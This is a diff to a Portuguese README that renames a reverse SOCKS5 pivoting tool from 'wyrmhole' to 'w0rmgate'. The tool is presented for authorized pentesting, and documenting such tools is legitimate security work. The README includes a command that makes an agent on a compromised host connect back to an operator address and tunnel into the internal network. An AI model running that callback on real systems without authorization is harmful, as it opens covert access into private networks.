@@ -1,4 +1,4 @@
-# wyrmhole
+# w0rmgate
 
 Túnel **SOCKS5 reverso** para pivoting em pentest autorizado. O agente roda no
 host comprometido e **liga de volta** ao operador; o operador ganha um proxy
@@ -11,7 +11,7 @@ de entrada (NAT/firewall).
 ```
 operador (você)                         host comprometido
 ┌─────────────────────┐                 ┌──────────────────┐
-│ wyrmhole server     │◄───── liga ─────│ wyrmhole agent   │
+│ w0rmgate server     │◄───── liga ─────│ w0rmgate agent   │
 │  :7000 controle     │   de volta      │                  │
 │  :1080 SOCKS5 ──────┼─ túnel mux ────►│  dial rede interna
 └─────────────────────┘                 └──────────────────┘
@@ -23,11 +23,11 @@ Multiplexa várias conexões SOCKS sobre um único canal TCP (frames
 ## Uso
 No operador:
 ```sh
-wyrmhole server --control 0.0.0.0:7000 --socks 127.0.0.1:1080
+w0rmgate server --control 0.0.0.0:7000 --socks 127.0.0.1:1080
 ```
 No host comprometido:
 ```sh
-wyrmhole agent --connect SEU_IP:7000
+w0rmgate agent --connect SEU_IP:7000
 ```
 Depois:
 ```sh
